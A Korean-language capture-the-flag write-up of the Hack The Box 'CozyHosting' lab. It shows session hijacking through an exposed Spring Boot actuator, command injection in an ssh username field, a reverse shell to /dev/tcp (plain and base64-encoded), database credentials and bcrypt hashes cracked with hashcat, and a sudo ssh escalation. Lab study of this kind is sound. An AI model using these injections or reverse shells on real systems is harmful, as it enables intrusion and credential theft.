---
slug: "cozyhosting"
title: "CozyHosting"
date: 2026-06-26
category: "HTB"
tags: []
excerpt: "/login 접속 후 로그인 패킷 주고 받는 과정 확인해보니 bootstrap 5.2.3 ver 사용하는 듯 함 -> 이건 의미 없음"
readingTime: 9
---

#### Box: CozyHosting | Linux | Easy
날짜: 2026.06.25
소요시간:

##### Open Ports
22
80

##### Interesting Services
80포트 접속 안돼서 /etc/host로 등록후 접속
~~~sh
echo "10.129.19.55 cozyhosting.htb" | sudo tee -a /etc/hosts
~~~
footer에 bootstrap을 쓴다는 듯한 BootstrapMade 라는 게 있음

/login 접속 후 로그인 패킷 주고 받는 과정 확인해보니 bootstrap 5.2.3 ver 사용하는 듯 함
-> 이건 의미 없음

spring boot에는 /actuator를 열어 놓는 경우가 많다고함
/actuator에 보면 /sesseions 가 열려 있다고 해서 들어가보니 
~~~
|6CA57225D0EB717541102E730E8C7F95|"kanderson"|
~~~
이렇게 있어서 세션값에 넣고 관리자 권한으로 로그인 성공

아래 ssh를 접속해주는 듯한 녀석이 있고 아무 값이나 넣어서 burp 확인해보니 
~~~
host=10.10.15.242&username=kali
~~~
이런식으로 body가 구성돼 있음

ssh kali@10.10.15.242 이런 식으로 접속하니까

username에다가  `;${IFS}whoami${IFS}#` 이렇게 넣으면 되지 않을까라는 생각이 들었음음
~~~shell
;whoami#

-> 결과가 url창에 뜸
http://cozyhosting.htb/admin?error=usage:%20ssh%20[-46AaCfGgKkMNnqsTtVvXxYy]%20[-B%20bind_interface]%20%20%20%20%20%20%20%20%20%20%20[-b%20bind_address]%20[-c%20cipher_spec]%20[-D%20[bind_address:]port]%20%20%20%20%20%20%20%20%20%20%20[-E%20log_file]%20[-e%20escape_char]%20[-F%20configfile]%20[-I%20pkcs11]%20%20%20%20%20%20%20%20%20%20%20[-i%20identity_file]%20[-J%20[user@]host[:port]]%20[-L%20address]%20%20%20%20%20%20%20%20%20%20%20[-l%20login_name]%20[-m%20mac_spec]%20[-O%20ctl_cmd]%20[-o%20option]%20[-p%20port]%20%20%20%20%20%20%20%20%20%20%20[-Q%20query_option]%20[-R%20address]%20[-S%20ctl_path]%20[-W%20host:port]%20%20%20%20%20%20%20%20%20%20%20[-w%20local_tun[:remote_tun]]%20destination%20[command%20[argument%20...]]/bin/bash:%20line%201:%20whoami#@10.10.15.242:%20command%20not%20found
~~~
-> 주석 전에 하나 띄어 쓰기 해야하는데 그거 안써서 지금 저렇게 나오는거 
~~~
;${IFS}whoami${IFS}#
~~~
이렇게 해보니까 /executessh 페이지로 넘어가지기만 하고 진전이 없음 

아예 리버스 쉘을 넣어볼 생각임 위에 에러메시지 보면 /bin/bash로 실행되니 간단한 리버스 쉘을 넣어도 될거 같음
~~~exploit
UserName 창에 아래와 같이 입력

;bash%09-i%09>&%09/dev/tcp/10.10.15.242/5555%090>&1#
~~~
-> ambiguos redirect(리다이렉션 문구가 헷갈려요 ㅠㅠ) 라는 문구가 뜸
~~~shell
# 칼리에서 base64 먼저 하고
echo 'bash -i >& /dev/tcp/10.10.15.242/5555 0>&1' | base64

이후에 그걸 보냄
;echo${IFS}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4yNDIvNTU1NSAwPiYxCg=="|base64${IFS}-d|bash;
~~~
**python으로 열고 wget으로 하는 방법도 있음**

##### Initial Foothold
벡터:
명령어:

##### Privilege Escalation(1)
벡터:
명령어:
접속 해보면 해당 디렉토리에 .jar 파일이 있음 이를 /tmp에 옮기고 압축을 풀어서 내용을 확인해보면 됨
~~~shell
cp <이름.jar> /tmp

unzip <이름.jar>
~~~

이러고 안에 들어가서 META-INF 디렉토리에 있는 파일내용 보면 내용이 다음과 같음
~~~shell
cat META-INF/MANIFEST.MF
Manifest-Version: 1.0
Created-By: Maven JAR Plugin 3.3.0
Build-Jdk-Spec: 17
Implementation-Title: cloudhosting
Implementation-Version: 0.0.1
Main-Class: org.springframework.boot.loader.JarLauncher
Start-Class: htb.cloudhosting.CozyHostingApp
Spring-Boot-Version: 3.0.2
Spring-Boot-Classes: BOOT-INF/classes/
Spring-Boot-Lib: BOOT-INF/lib/
Spring-Boot-Classpath-Index: BOOT-INF/classpath.idx
Spring-Boot-Layers-Index: BOOT-INF/layers.idx
~~~

BOOT-INF/classes 디렉토리 부터 확인
~~~shell
ls
application.properties
htb
static
templates
~~~

-> 앱 의존성 파일을 확인해보니 다음과 같은 내용이 들어 있음
~~~shell
cat application.properties

server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
~~~
db username, password 획득했으니 접속
~~~shell
psql -U postgres -h 127.0.0.1 -p 5432
~~~
이 잘안되니  쉘 업그레이드 ㄱㄱ
~~~shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
~~~

이후 users 테이블 확인해보면 id pw가 있는데 
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim 
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm 
pw가 bycrypt로 암호화 돼 있음 hashcat 사용해서 복호화 ㄱㄱ  참고 [[HASH]]
~~~shell
hashcat -m 3200 -a 0 '$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm' /usr/share/wordlists/rockyou.txt

# results: manchesterunited
~~~

**비밀번호 재사용 한거 노리고 접속하면 성공**
~~~shell
ls /home

su josh
~~~

hashcat -m 3200 -a 0 '$2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim ' /usr/share/wordlists/rockyou.txt
##### Privilege Escalation(1)
sudo -l 해보니까 ssh를 사용할 수 있다고 함

**GTFOBins**
~~~shell
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
~~~
https://gtfobins.linuxsec.org/   -> 여기서 sudo -l 해서 나온거 기준 GTFO bins 보는거 습관처럼 하면 좋을듯

##### Rabbit Hole (막혔던 것)

##### 다음 박스에서 써먹을 것
- spring boot /actuator
- db 뒤져서 크레덴셜 찾기
- hashcat
- gtfobins
